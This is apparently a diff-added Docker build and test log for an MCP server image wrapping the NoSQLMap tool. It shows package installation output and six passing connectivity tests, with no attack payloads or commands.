+#13 2.788 Downloading rich-14.3.3-py3-none-any.whl (310 kB)
+#13 2.808 Downloading uncalled_for-0.2.0-py3-none-any.whl (11 kB)
+#13 2.816 Downloading uvicorn-0.42.0-py3-none-any.whl (68 kB)
+#13 2.824 Downloading watchfiles-1.1.1-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl (449 kB)
+#13 2.849 Downloading websockets-16.0-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl (186 kB)
+#13 2.864 Downloading aiofile-3.9.0-py3-none-any.whl (19 kB)
+#13 2.873 Downloading annotated_types-0.7.0-py3-none-any.whl (13 kB)
+#13 2.881 Downloading anyio-4.12.1-py3-none-any.whl (113 kB)
+#13 2.890 Downloading attrs-26.1.0-py3-none-any.whl (67 kB)
+#13 2.898 Downloading beartype-0.22.9-py3-none-any.whl (1.3 MB)
+#13 2.977    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.3/1.3 MB 14.2 MB/s eta 0:00:00
+#13 2.985 Downloading cachetools-7.0.5-py3-none-any.whl (13 kB)
+#13 2.994 Downloading click-8.3.1-py3-none-any.whl (108 kB)
+#13 3.004 Downloading docstring_parser-0.17.0-py3-none-any.whl (36 kB)
+#13 3.014 Downloading email_validator-2.3.0-py3-none-any.whl (35 kB)
+#13 3.022 Downloading h11-0.16.0-py3-none-any.whl (37 kB)
+#13 3.029 Downloading httpx_sse-0.4.3-py3-none-any.whl (9.0 kB)
+#13 3.037 Downloading importlib_metadata-8.7.1-py3-none-any.whl (27 kB)
+#13 3.044 Downloading jsonschema-4.26.0-py3-none-any.whl (90 kB)
+#13 3.052 Downloading keyring-25.7.0-py3-none-any.whl (39 kB)
+#13 3.059 Downloading markdown_it_py-4.0.0-py3-none-any.whl (87 kB)
+#13 3.068 Downloading pathable-0.5.0-py3-none-any.whl (16 kB)
+#13 3.074 Downloading pydantic_settings-2.13.1-py3-none-any.whl (58 kB)
+#13 3.081 Downloading pygments-2.19.2-py3-none-any.whl (1.2 MB)
+#13 3.116    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.2/1.2 MB 31.9 MB/s eta 0:00:00
+#13 3.124 Downloading pyjwt-2.12.1-py3-none-any.whl (29 kB)
+#13 3.130 Downloading cryptography-46.0.5-cp311-abi3-manylinux_2_34_aarch64.whl (4.3 MB)
+#13 3.450    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.3/4.3 MB 13.0 MB/s eta 0:00:00
+#13 3.459 Downloading python_multipart-0.0.22-py3-none-any.whl (24 kB)
+#13 3.469 Downloading referencing-0.37.0-py3-none-any.whl (26 kB)
+#13 3.480 Downloading rich_rst-1.3.2-py3-none-any.whl (12 kB)
+#13 3.488 Downloading sse_starlette-3.3.3-py3-none-any.whl (14 kB)
+#13 3.497 Downloading starlette-0.52.1-py3-none-any.whl (74 kB)
+#13 3.506 Downloading typing_extensions-4.15.0-py3-none-any.whl (44 kB)
+#13 3.515 Downloading typing_inspection-0.4.2-py3-none-any.whl (14 kB)
+#13 3.524 Downloading caio-0.9.25-cp312-cp312-manylinux_2_34_aarch64.whl (81 kB)
+#13 3.533 Downloading cffi-2.0.0-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.whl (220 kB)
+#13 3.545 Downloading jeepney-0.9.0-py3-none-any.whl (49 kB)
+#13 3.554 Downloading jsonschema_specifications-2025.9.1-py3-none-any.whl (18 kB)
+#13 3.565 Downloading mdurl-0.1.2-py3-none-any.whl (10.0 kB)
+#13 3.574 Downloading rpds_py-0.30.0-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl (390 kB)
+#13 3.587 Downloading secretstorage-3.5.0-py3-none-any.whl (15 kB)
+#13 3.597 Downloading zipp-3.23.0-py3-none-any.whl (10 kB)
+#13 3.608 Downloading docutils-0.22.4-py3-none-any.whl (633 kB)
+#13 3.617    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 633.2/633.2 kB 76.5 MB/s eta 0:00:00
+#13 3.626 Downloading jaraco.classes-3.4.0-py3-none-any.whl (6.8 kB)
+#13 3.634 Downloading jaraco_context-6.1.1-py3-none-any.whl (7.0 kB)
+#13 3.645 Downloading jaraco_functools-4.4.0-py3-none-any.whl (10 kB)
+#13 3.654 Downloading more_itertools-10.8.0-py3-none-any.whl (69 kB)
+#13 3.664 Downloading pycparser-3.0-py3-none-any.whl (48 kB)
+#13 3.774 Installing collected packages: pyperclip, zipp, websockets, uncalled-for, typing-extensions, rpds-py, pyyaml, python-multipart, python-dotenv, pyjwt, pygments, pycparser, platformdirs, pathable, packaging, more-itertools, mdurl, jsonref, jeepney, jaraco.context, httpx-sse, h11, email-validator, docutils, docstring-parser, click, caio, cachetools, beartype, attrs, annotated-types, uvicorn, typing-inspection, referencing, pydantic-core, py-key-value-aio, markdown-it-py, jaraco.functools, jaraco.classes, importlib-metadata, httpcore, exceptiongroup, cffi, anyio, aiofile, watchfiles, starlette, rich, pydantic, opentelemetry-api, jsonschema-specifications, jsonschema-path, httpx, cryptography, sse-starlette, SecretStorage, rich-rst, pydantic-settings, openapi-pydantic, jsonschema, authlib, mcp, keyring, cyclopts, fastmcp
+#13 6.045 Successfully installed SecretStorage-3.5.0 aiofile-3.9.0 annotated-types-0.7.0 anyio-4.12.1 attrs-26.1.0 authlib-1.6.9 beartype-0.22.9 cachetools-7.0.5 caio-0.9.25 cffi-2.0.0 click-8.3.1 cryptography-46.0.5 cyclopts-4.10.0 docstring-parser-0.17.0 docutils-0.22.4 email-validator-2.3.0 exceptiongroup-1.3.1 fastmcp-3.1.1 h11-0.16.0 httpcore-1.0.9 httpx-0.28.1 httpx-sse-0.4.3 importlib-metadata-8.7.1 jaraco.classes-3.4.0 jaraco.context-6.1.1 jaraco.functools-4.4.0 jeepney-0.9.0 jsonref-1.1.0 jsonschema-4.26.0 jsonschema-path-0.4.5 jsonschema-specifications-2025.9.1 keyring-25.7.0 markdown-it-py-4.0.0 mcp-1.26.0 mdurl-0.1.2 more-itertools-10.8.0 openapi-pydantic-0.5.1 opentelemetry-api-1.40.0 packaging-26.0 pathable-0.5.0 platformdirs-4.9.4 py-key-value-aio-0.4.4 pycparser-3.0 pydantic-2.12.5 pydantic-core-2.41.5 pydantic-settings-2.13.1 pygments-2.19.2 pyjwt-2.12.1 pyperclip-1.11.0 python-dotenv-1.2.2 python-multipart-0.0.22 pyyaml-6.0.3 referencing-0.37.0 rich-14.3.3 rich-rst-1.3.2 rpds-py-0.30.0 sse-starlette-3.3.3 starlette-0.52.1 typing-extensions-4.15.0 typing-inspection-0.4.2 uncalled-for-0.2.0 uvicorn-0.42.0 watchfiles-1.1.1 websockets-16.0 zipp-3.23.0
+#13 6.045 WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.
+#13 6.128 
+#13 6.128 [notice] A new release of pip is available: 25.0.1 -> 26.0.1
+#13 6.128 [notice] To update, run: pip install --upgrade pip
+#13 DONE 6.3s
+
+#14 [ 9/10] COPY mcp_server.py ./
+#14 DONE 0.0s
+
+#15 [10/10] RUN mkdir -p /app/output && chown -R mcpuser:mcpuser /app
+#15 DONE 0.1s
+
+#16 exporting to image
+#16 exporting layers
+#16 exporting layers 2.8s done
+#16 exporting manifest sha256:77fbe23fe35fedc39c27ef3a2c2ce0fab2f4c525ecbeaa9e7c37375d84149e43
+#16 exporting manifest sha256:77fbe23fe35fedc39c27ef3a2c2ce0fab2f4c525ecbeaa9e7c37375d84149e43 done
+#16 exporting config sha256:3e162bc552dafbf0f0f103a418e7d210178a6bffdd6d53e6f4428c18e91b0da4 done
+#16 exporting attestation manifest sha256:b1bc294f9a317b2b3446cfb1570a337a7ec3e6eb93a3a0f1a702a1244f777452 done
+#16 exporting manifest list sha256:7d9f8298d6488b53bf3cc50ab58c2df4bf542db5ddb7350f18ba4e5dc75d719b done
+#16 naming to docker.io/hackerdogs/nosqlmap-mcp:latest done
+#16 unpacking to docker.io/hackerdogs/nosqlmap-mcp:latest
+#16 unpacking to docker.io/hackerdogs/nosqlmap-mcp:latest 0.9s done
+#16 DONE 3.8s
+  [0;32m✅ PASS: Docker image hackerdogs/nosqlmap-mcp:latest exists[0m
+
+[0;34m[Test 2] CLI binary inside container[0m
+  [0;32m✅ PASS: nosqlmap binary responds[0m
+       /opt/NoSQLMap/nosqlmap.py:66: SyntaxWarning: invalid escape sequence '\|'
+
+[0;34m[Test 3] MCP stdio mode — initialize + tools/list[0m
+  [0;32m✅ PASS: stdio mode returned tools/list response (       1 tool names found)[0m
+
+[0;34m[Test 4] MCP HTTP streamable mode — initialize[0m
+  [0;32m✅ PASS: HTTP streamable mode responded (status 200)[0m
+       Session ID: d0eadf73172e45cd...
+
+[0;34m[Test 5] MCP HTTP — tools/list[0m
+  [0;32m✅ PASS: HTTP tools/list returned tools[0m
+
+[0;34m[Test 6] MCP HTTP — tools/call (run_nosqlmap)[0m
+  [0;32m✅ PASS: tools/call run_nosqlmap returned a result[0m
+
+=================================================================================
+[0;34mResults: [0;32m6 passed[0m, [0;31m0 failed[0m
+=================================================================================
+nosqlmap-mcp-test
+nosqlmap-mcp-test
